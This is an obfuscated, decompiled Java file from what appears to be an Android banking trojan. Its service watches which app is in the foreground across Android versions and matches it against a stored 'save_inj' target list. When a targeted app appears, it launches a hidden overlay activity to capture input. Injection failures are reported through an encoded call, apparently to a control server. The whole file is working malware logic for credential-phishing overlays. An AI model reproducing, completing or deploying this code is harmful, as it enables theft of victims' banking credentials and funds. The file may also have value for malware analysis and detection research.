package wocwvy.czyxoxmbauu.slsa;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.IntentService;
import android.app.KeyguardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build.VERSION;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.ncec.pltrfi;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p003b.C0080g;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p003b.C0083h;

public class wfveenegvz extends IntentService {

    /* renamed from: a */
    C0034b f593a = new C0034b();

    /* renamed from: b */
    Context f594b;

    /* renamed from: c */
    C0039c f595c = new C0039c();

    public wfveenegvz() {
        super("");
    }

    /* renamed from: b */
    private ArrayList<String> m361b() {
        String j;
        ArrayList<String> arrayList = new ArrayList<>();
        if (VERSION.SDK_INT <= 19) {
            List runningTasks = ((ActivityManager) getSystemService("activity")).getRunningTasks(1);
            ComponentName componentName = ((RunningTaskInfo) runningTasks.get(0)).topActivity;
            j = ((RunningTaskInfo) runningTasks.get(0)).topActivity.getPackageName();
        } else if (VERSION.SDK_INT > 19 && VERSION.SDK_INT <= 21) {
            j = ((RunningAppProcessInfo) ((ActivityManager) getSystemService("activity")).getRunningAppProcesses().get(0)).processName;
        } else if (VERSION.SDK_INT <= 21 || VERSION.SDK_INT > 23) {
            int i = VERSION.SDK_INT;
            j = this.f593a.mo240j(this.f594b);
        } else {
            List<C0080g> a = C0083h.m339a(this);
            ArrayList<String> arrayList2 = new ArrayList<>();
            for (C0080g d : a) {
                arrayList2.add(d.mo406d().trim());
            }
            return arrayList2;
        }
        arrayList.add(j);
        return arrayList;
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public void mo461a() {
        this.f593a.mo213a("Start", "apiProc");
        String e = this.f593a.mo234e(this.f594b, "save_inj");
        int i = 0;
        while (true) {
            if (i == 0) {
                e = this.f593a.mo234e(this.f594b, "save_inj");
                if (e.length() <= 4) {
                    stopSelf();
                    return;
                }
            }
            if (i >= 40) {
                i = -1;
            }
            i++;
            if (this.f593a.mo237g(this)) {
                stopSelf();
            }
            Context context = this.f594b;
            if (((KeyguardManager) getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                try {
                    TimeUnit.MILLISECONDS.sleep(10);
                } catch (InterruptedException e2) {
                    e2.printStackTrace();
                }
            } else if (e != "" && this.f593a.mo245o(this.f594b)) {
                try {
                    TimeUnit.MILLISECONDS.sleep(10);
                } catch (InterruptedException e3) {
                    e3.printStackTrace();
                }
                ArrayList b = m361b();
                StringBuilder sb = new StringBuilder();
                sb.append("");
                sb.append(b);
                this.f593a.mo213a("App", sb.toString());
                String str = null;
                for (String split : e.split("/")) {
                    String[] split2 = split.split(",");
                    int i2 = 1;
                    while (true) {
                        if (i2 >= split2.length) {
                            break;
                        } else if (b.contains(split2[i2])) {
                            str = split2[0];
                            break;
                        } else {
                            i2++;
                        }
                    }
                    if (str != null) {
                        break;
                    }
                }
                if (str != null) {
                    Context context2 = this.f594b;
                    if (!((KeyguardManager) getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                        try {
                            if (!this.f593a.mo234e(this.f594b, "name").contains("true")) {
                                Intent putExtra = new Intent(this, pltrfi.class).putExtra("str", str);
                                putExtra.addFlags(268435456);
                                putExtra.addFlags(8388608);
                                putExtra.addFlags(1073741824);
                                startActivity(putExtra);
                            }
                        } catch (Exception unused) {
                            StringBuilder sb2 = new StringBuilder();
                            sb2.append("p=");
                            C0034b bVar = this.f593a;
                            StringBuilder sb3 = new StringBuilder();
                            sb3.append(this.f593a.mo247q(this));
                            sb3.append("|ERROR START INJECTIONS|");
                            sb2.append(bVar.mo225c(sb3.toString()));
                            this.f593a.mo218b(this.f594b, "4", sb2.toString());
                        }
                    }
                }
            }
        }
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        this.f594b = this;
        this.f593a.mo233d(this.f594b, "name", "false");
        if (this.f593a.mo234e(this.f594b, "save_inj").length() <= 5) {
            stopSelf();
        }
        mo461a();
    }
}
